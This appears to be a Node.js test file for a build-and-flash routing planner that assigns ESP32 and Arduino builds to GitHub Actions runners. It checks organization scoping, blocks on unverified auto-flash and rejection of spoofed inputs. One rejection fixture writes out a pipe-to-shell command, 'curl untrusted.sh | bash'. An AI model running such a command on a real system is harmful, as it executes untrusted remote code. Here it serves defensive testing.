import {test} from "node:test";
import assert from "node:assert/strict";
import {planBuildFlashRoute,routeSummaries,validateRouteRemoval} from "./build_flash_routing.mjs";

const now=new Date().toISOString();
const projects=[{fullName:"MainCreate/WaymarkerOS",archived:false},
 {fullName:"MainCreate/old-project",archived:true}];
const builders=[
 {id:"pi",name:"pi-builder",managedHost:{id:"host"},os:"linux",arch:"arm64",
  lastSeen:now,githubRunnerName:"maincreate-pi",assignment:{displayName:"ESP32 Pi"}},
 {id:"mac",name:"mac-builder",managedHost:{id:"mac"},os:"macos",arch:"arm64",lastSeen:now,
  githubRunnerName:"maincreate-mac"},
 {id:"unmanaged",name:"unmanaged",os:"linux",arch:"arm64"},
 {id:"no-gh",name:"standalone",managedHost:{id:"host"},os:"linux",arch:"arm64"}
];
const devices=[
 {id:"a".repeat(32),runnerId:"pi",label:"ESP32 S3",connected:true,identityConfidence:"serial"},
 {id:"b".repeat(32),runnerId:"mac",label:"Arduino",connected:true,identityConfidence:"location"}
];
const ctx={organization:"MainCreate",projects,builders,devices};
const base={repository:"MainCreate/WaymarkerOS",buildBuilderId:"pi",
 buildTrigger:"github-actions",sdkFamily:"esp-idf",sdkVersion:"5.5.6"};

test("Create a GitHub Actions route scoped to an installed managed runner",()=>{
 const route=planBuildFlashRoute(base,ctx,"admin");
 assert.equal(route.repository,base.repository);
 assert.equal(route.buildTrigger,"github-actions");
 assert.equal(route.builder.runnerName,"maincreate-pi");
 assert.deepEqual(route.sdk,{family:"esp-idf",version:"5.5.6",readiness:"pilot"});
 assert.equal(route.autoFlashRequested,false);
 assert.equal(route.autoFlashEnabled,false);
 assert.equal(route.status,"configuration-only");
 assert.equal(route.checks.find(x=>x.key==="flash-adapter").passed,false);
});

test("Accept an explicit auto-flash preference but never arm it without actual verification",()=>{
 const route=planBuildFlashRoute({...base,flashBuilderId:"pi",deviceId:"a".repeat(32),
  autoFlashRequested:true},ctx);
 assert.equal(route.autoFlashRequested,true);
 assert.equal(route.autoFlashEnabled,false);
 assert.equal(route.device.runnerId,route.flashBuilderId);
 assert.match(route.note,/cannot execute/);
 assert.equal(route.checks.find(x=>x.key==="device-identity").passed,false);
 assert.equal(route.checks.find(x=>x.key==="artifact-provenance").passed,false);
});

test("Reject cross-runner device routing and unverified auto-flash selections",()=>{
 for(const extra of [
   {flashBuilderId:"pi",deviceId:"b".repeat(32),autoFlashRequested:true},
   {flashBuilderId:"mac",deviceId:"a".repeat(32),autoFlashRequested:true},
   {autoFlashRequested:true},
   {flashBuilderId:"pi",autoFlashRequested:true},
   {deviceId:"a".repeat(32)}
 ])assert.throws(()=>planBuildFlashRoute({...base,...extra},ctx));
});

test("Reject repository spoofing, unknown toolchains, unmanaged hosts and invalid automation",()=>{
 for(const extra of [
  {repository:"AnotherOrg/WaymarkerOS"}, {repository:"MainCreate/old-project"},
  {repository:"MainCreate/missing"},{buildBuilderId:"unmanaged"},
  {buildBuilderId:"no-gh"},{sdkVersion:"6.4.0"},
  {sdkFamily:"swift",sdkVersion:"6.1.2"},
  {buildTrigger:"webhook-arbitrary-shell"}, {autoFlashRequested:"true"},
  {command:"curl untrusted.sh | bash"}
 ]) assert.throws(()=>planBuildFlashRoute({...base,...extra},ctx));
});
test("Manual mode can save a route before SDK assignment or GitHub runner enrollment",()=>{
 const route=planBuildFlashRoute({repository:base.repository,buildBuilderId:"no-gh",buildTrigger:"manual"},ctx);
 assert.equal(route.sdk,null);assert.equal(route.buildTrigger,"manual");
 assert.equal(route.autoFlashEnabled,false);assert.equal(route.status,"configuration-only");
});

test("Summaries isolate organizations and reflect device disappearance without enabling flash",()=>{
 const route=planBuildFlashRoute({...base,flashBuilderId:"pi",deviceId:"a".repeat(32),
  autoFlashRequested:true},ctx);
 const visible=routeSummaries([route,{...route,organization:"OtherOrg"}],"MainCreate",projects,builders,[]);
 assert.equal(visible.length,1);assert.equal(visible[0].device,null);
 assert.equal(visible[0].autoFlashEnabled,false);
 assert.deepEqual(routeSummaries([route],"OtherOrg",projects,builders,devices),[]);
});

test("Routing removal is limited to current synchronized organization's known repositories",()=>{
 assert.equal(validateRouteRemoval(base.repository,"MainCreate",projects),true);
 assert.throws(()=>validateRouteRemoval("OtherOrg/foo","MainCreate",projects));
 assert.throws(()=>validateRouteRemoval("MainCreate/missing","MainCreate",projects));
});
